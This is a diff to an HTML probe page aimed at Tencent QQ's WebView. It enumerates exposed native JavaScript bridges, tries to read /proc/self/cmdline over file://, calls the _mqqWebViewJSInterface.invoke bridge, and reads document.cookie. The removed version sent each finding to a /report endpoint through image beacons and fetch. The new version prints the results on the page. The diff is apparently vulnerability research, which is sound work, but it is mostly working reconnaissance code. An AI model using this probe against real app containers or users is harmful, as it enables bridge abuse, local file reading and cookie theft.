@@ -1,52 +1,57 @@
-<!DOCTYPE html><html><head><meta charset="utf-8"><title>QQBRIDGEPROBE</title></head><body>
-<h3 id="st">probing...</h3>
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>QQBRIDGEPROBE</title>
+<style>body{background:#fff;color:#000;font:11px monospace;word-break:break-all;margin:4px;padding:0}</style>
+</head><body><div id="out">== QQ BRIDGE PROBE ==</div>
 <script>
-var FOUND = {};
-function rep(tag, data) {
-  try { new Image().src = '/report?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(String(data)).slice(0, 3000); } catch(e) {}
-  try { fetch('/report?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(String(data)).slice(0, 3000)); } catch(e) {}
-}
-rep('loaded', location.href + ' | ua=' + navigator.userAgent.slice(0,120));
+function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
+function w(t){document.getElementById('out').innerHTML += '<br>' + esc(t);}
+w('URL=' + location.href);
+w('UA=' + navigator.userAgent.slice(0,80));
 
-// 1) 枚举 window 上的可疑 bridge 对象
+// 1) window 全量可疑属性
 var keys = Object.getOwnPropertyNames(window);
-var suspects = [];
-for (var i = 0; i < keys.length; i++) {
-  var k = keys[i];
-  if (/bridge|Bridge|jsApi|JsApi|mqq|qimei|webso|Weixin|hippy|dt|tbs|qb|_mqq|interface|Interface|jsbridge/i.test(k)) {
-    try { suspects.push(k + ':' + typeof window[k]); } catch(e) {}
-  }
-}
-rep('window_suspects', suspects.join('|') || 'NONE');
+var sus = [];
+for (var i=0;i<keys.length;i++){var k=keys[i];
+  if (/bridge|Bridge|jsApi|JsApi|mqq|qimei|webso|Weixin|hippy|dtB|tbs|qb|_mqq|Interface|jsbridge|native|Native|app/i.test(k)){
+    try{sus.push(k+':'+typeof window[k]);}catch(e){}}}
+w('SUS('+sus.length+'): '+sus.slice(0,40).join(' | '));
 
-// 2) 已知 bridge 名清单逐一探测
+// 2) 已知 bridge
 var known = ['_mqqWebViewJSInterface','_webso','qimeiBridge','dtBridge','DTJsBridgeInterface',
   'WeixinJSCore','QQJSCore','hippy','webbundle','docsPreview','docs','local_obj','ECommerceJSBridge',
-  'TenvideoJSBridge','QQLiveJavaInterface','appApi','jsApi','JsBridge','NativeApp','_AppInterface'];
-var hits = [];
-for (var j = 0; j < known.length; j++) {
-  try { if (window[known[j]] !== undefined) {
-    var t = typeof window[known[j]];
-    var meth = [];
-    try { meth = Object.keys(window[known[j]]).slice(0, 20); } catch(e) { meth = ['<nokeys:' + e.message + '>']; }
-    hits.push(known[j] + '=' + t + '(' + meth.join(',') + ')');
-  } } catch(e) {}
-}
-rep('known_bridges', hits.join(' || ') || 'NONE');
+  'appApi','jsApi','JsBridge','NativeApp','_AppInterface','TenvideoJSBridge','QQLiveJavaInterface'];
+var hits=[];
+for (var j=0;j<known.length;j++){try{if(window[known[j]]!==undefined){
+  var meth=[];try{meth=Object.keys(window[known[j]]).slice(0,20);}catch(e){meth=['?'];}
+  hits.push(known[j]+'('+meth.join(',')+')');}}catch(e){}}
+w('HITS('+hits.length+'): '+(hits.join(' || ')||'NONE'));
 
-// 3) 尝试调用 _mqqWebViewJSInterface.invoke 的存在性探测（不真正调敏感方法）
-try {
-  if (window._mqqWebViewJSInterface) {
-    rep('mqq_iface', 'present, keys=' + Object.getOwnPropertyNames(window._mqqWebViewJSInterface).join(','));
+// 3) _mqqWebViewJSInterface.invoke 探测
+try{
+  if(window._mqqWebViewJSInterface){
+    w('MQQ_IFACE props: '+Object.getOwnPropertyNames(window._mqqWebViewJSInterface).join(','));
   }
-} catch(e) { rep('mqq_iface_err', e.message); }
+}catch(e){w('MQQ_ERR:'+e.message);}
 
-// 4) file:// 读探测（若容器有 universal access）
-try {
-  fetch('file:///proc/self/cmdline').then(function(r){ return r.text(); }).then(function(t){
-    rep('file_read_cmdline', t.slice(0, 200));
-  }).catch(function(e){ rep('file_read_cmdline_err', e.message); });
-} catch(e) { rep('file_read_err', String(e)); }
+// 4) file:// 读探测
+try{
+  fetch('file:///proc/self/cmdline').then(function(r){return r.text();}).then(function(t){
+    w('FILE_READ: '+t.slice(0,100));
+  }).catch(function(e){w('FILE_ERR: '+e.message);});
+}catch(e){w('FETCH_ERR:'+String(e));}
 
-setTimeout(function(){ document.getElementById('st').textContent = 'DONE_KEYS=' + suspects.length + '_HITS=' + hits.length; }, 800);
+// 5) 尝试调 _mqqWebViewJSInterface.invoke 一个无害方法（getDeviceInfo 或类似）
+try{
+  if(window._mqqWebViewJSInterface && window._mqqWebViewJSInterface.invoke){
+    // QQ 的 invoke 格式：JSON.stringify({method, types, args, from, pageSize})
+    var msg = JSON.stringify({method:'publicAccount.isFollowUin',types:[],args:[],from:'qq',pageSize:1});
+    var r = window._mqqWebViewJSInterface.invoke(msg);
+    w('INVOKE_TEST: '+String(r).slice(0,200));
+  }
+}catch(e){w('INVOKE_ERR:'+e.message);}
+
+// 6) Cookie 读取
+try{w('COOKIE: '+document.cookie.slice(0,200));}catch(e){w('COOKIE_ERR:'+e.message);}
+try{w('TITLE: '+document.title);}catch(e){}
+
+setTimeout(function(){w('== DONE ==');},2000);
 </script></body></html>
